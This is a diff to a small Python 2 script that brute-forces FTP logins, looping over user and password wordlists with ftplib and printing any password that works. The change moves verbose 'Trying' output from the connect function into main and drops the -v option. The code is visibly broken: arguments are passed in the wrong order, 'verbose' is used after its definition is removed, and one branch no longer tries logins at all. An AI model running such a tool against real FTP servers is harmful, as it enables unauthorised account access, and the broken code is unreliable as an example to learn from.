@@ -2,17 +2,14 @@ import ftplib
 from threading import  *
 import optparse
 
-def connect(hostname, user, password, verbose):
+def connect(hostname, user, password):
 	try:
-		
-		f verbose:
-			print '[*] Trying %s:%s'%(user, password)
 		password = password.strip('\n')
 		ftp = ftplib.FTP(hostname)
 		ftp.login(user, password)
 		print '[*] Found Password : %s/%s'%(user,password)
 		Found = True
-	except Exception, e:
+	except:
 		pass
 
 
@@ -22,14 +19,13 @@ def main():
 	parser.add_option('-P', dest='Passwords', type='string', help='---')
 	parser.add_option('-H', dest='Host', type='string', help='---')
 	parser.add_option('-U', dest='Users', type='string', help='---')
-	parser.add_option('-v', dest='verbose', type='string', help='---')
+
 	(options, args) = parser.parse_args()
 	
 	User = options.User
 	Users = options.Users
 	Host = options.Host
 	Passwords = options.Passwords
-	verbose = options.verbose
 
 	if (User == None & Users == None) | (Host == None) | (Passwords == None):
 		print parser.usage
@@ -48,10 +44,13 @@ def main():
 			f = open(Users, 'r')
 			for User in f.readlines():
 				for Pass in Passwords.readlines():
-					connect(User, Host, Pass.strip('\n'), verbose)
+					if verbose:
+						print '[*] Trying %s:%s'%(User,Pass.strip('\n'))
+					connect(User, Host, Pass.strip('\n'))
 	else:
 		for Pass in Passwords.readlines():
-			connect(User, Host,Pass.strip('\n'), verbose)
+			if verbose:
+				print '[*] Trying %s:%s'%(User, Pass.strip('\n'))
 
 
 if __name__ == '__main__':
